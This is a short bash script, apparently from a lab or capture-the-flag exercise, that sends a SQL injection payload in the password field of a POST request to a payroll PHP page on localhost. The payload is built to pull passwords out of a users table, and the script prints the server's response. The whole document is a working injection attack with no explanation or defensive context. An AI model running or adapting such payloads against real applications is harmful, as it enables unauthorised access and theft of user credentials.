#!/bin/bash

url="http://127.0.0.1/payroll_app.php"
user='luke_skywalker'
injection="password'; select password from users where username='' OR ''='"

echo "Making POST request to $url with the following parameters:"
echo "'user' = $user"
echo "'password' = $injection"

# Perform the POST request using curl
response=$(curl -s -d "user=$user&password=$injection&s=OK" -X POST $url)

echo "Response body is $response"
echo "Done"
